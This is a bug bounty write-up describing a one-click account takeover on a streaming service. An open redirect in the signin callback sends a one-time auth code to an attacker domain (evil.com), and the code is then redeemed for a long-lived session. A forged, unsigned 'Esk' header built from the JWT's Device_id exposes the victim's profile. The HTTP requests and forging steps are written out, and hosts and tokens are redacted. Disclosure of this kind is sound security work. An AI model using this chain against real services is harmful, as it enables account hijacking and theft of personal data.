# Chaining an Open Redirect Into Account Takeover (P1 · CVSS 9.0)

- **Source URL:** https://medium.com/@josekuttykunnelthazhebinu/chaining-an-open-redirect-into-account-takeover-p1-cvss-9-0-a1aa68abb172
- **Fetched from:** https://medium.com/@josekuttykunnelthazhebinu/chaining-an-open-redirect-into-account-takeover-p1-cvss-9-0-a1aa68abb172?source=rss-9a2bf20ec9bf------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14975)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Josekutty Kunnelthazhe Binu / Sun, 08 Nov 2026 23:28:54 GMT

Zee Entertainment is one of India’s biggest media and television companies, running one of the largest OTT and streaming ecosystems in the country. When a new bug bounty program for Zee went live, there were zero submissions yet, so I decided to take a look before anyone else did. My plan was simple: skip the low-hanging fruit and go straight for the login and signup flow, since that’s usually where the highest-impact bugs live.

While testing the signin flow, I noticed a callback parameter that looked suspicious:

https://auth.\[REDACTED\]/signin?callback=https%3A%2F%2Fcq.\[REDACTED\]%2F

I swapped the value for my own domain:

https://auth.\[REDACTED\]/signin?callback=https%3A%2F%2Fevil.com%2F

It worked, a textbook open redirect. On its own, that’s usually a Low or Medium severity finding, so I kept digging instead of reporting it right away.

After triggering the redirect, the browser landed on:

https://evil.com/?pt=&tag=XXXX-SOME-RANDOM-CODE-XXXX

That tag value wasn’t random junk, it was a one-time authentication code, generated during the OTP login step and handed to the browser as part of the signin flow. Because the redirect sent the victim’s browser to an attacker-controlled domain with that code still attached, an attacker could capture it simply by getting a victim to click a link.

This is where the bug stopped being “just an open redirect” and became a credential leak.

That leaked code is issued by this request:

POST https://auth.\[REDACTED\]/partner/getcode

Which, following the normal OTP login flow, could be redeemed once at:

GET /partner/getdeviceuser?token=\[REDACTED\_TOKEN\] HTTP/2

Host: auth.\[REDACTED\]

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0

Accept: \*/\*

Accept-Language: en-GB,en;q=0.9

Accept-Encoding: gzip, deflate, br

Referer: https://\[REDACTED\]/

Content-Type: application/x-www-form-urlencoded

Origin: https://\[REDACTED\]

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-site

The response handed back a full session:

```
{
  "user": {
    "token": "[REDACTED_JWT]",
    "refresh_token": "[REDACTED_REFRESH_TOKEN]",
    "token_type": "Bearer",
    "expires_in": 4752000
  }
}
```
That expires\_in value is worth pausing on 4,752,000 seconds is roughly **55 days**. A leaked token here doesn’t just grant momentary access; it hands over a session that’s valid for almost two months.

With a valid JWT in hand, the natural next step was pulling the victim’s profile data:

GET /v1/user/ HTTP/2

Host: \[REDACTED\]

Device\_id: \[REDACTED\_DEVICE\_ID\]

Esk: \[REDACTED\]

Authorization: bearer \[REDACTED\_JWT\]

Referer: https://\[REDACTED\]/

Origin: https://\[REDACTED\]

But the API also required two extra headers Device\_id and Esk tied to the authenticated session. Without the matching values, the request failed. Swapping tokens between accounts one at a time didn’t work either. It looked like a dead end.

I decoded the JWT itself and found it carried more than just standard claims:

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "Device_id": "X-DEVICE-ID-X",
  "iat": 1516239022
}
```
The Device\_id was sitting right there inside the token, no guessing required.

That left the Esk header. I created a second test account, captured its Esk value, and decoded it from base64. The structure turned out to be:

Device\_id + unknown\_static\_value + unix\_timestamp +unixUnix\_timestamp\_in\_milliseconds

Since Esk was just base64-encoded and not signed or cryptographically bound to the session, I rebuilt it manually swapping in the victim’s Device\_id (recovered from their JWT in Step 5) alongside the other components, then re-encoding the result.

Replaying the request with the forged Esk header and the victim’s Device\_id:

…returned the victim’s full profile:

```
{
  "id": "[REDACTED_USER_ID]",
  "system": "Z5",
  "email": "[REDACTED_EMAIL]",
  "email_verified": true,
  "mobile": "",
  "mobile_verified": false,
  "first_name": "Guest",
  "last_name": "User",
  "activation_date": "[REDACTED_DATE]",
  "activated": true,
  "registration_country": "IN",
  "registration_region": "[REDACTED_REGION]"
}
```
Email, verification status, registration details all exposed, for any account, by anyone who could get a victim to click one crafted link.

Chained together, this is a one-click account takeover:

Unvalidated redirect callback parameter leaking the auth code — this is the entry point and the thing that makes the whole chain reachable by an attacker with no access at all.

Validate the callback/redirect parameter against a strict allowlist of trusted domains.
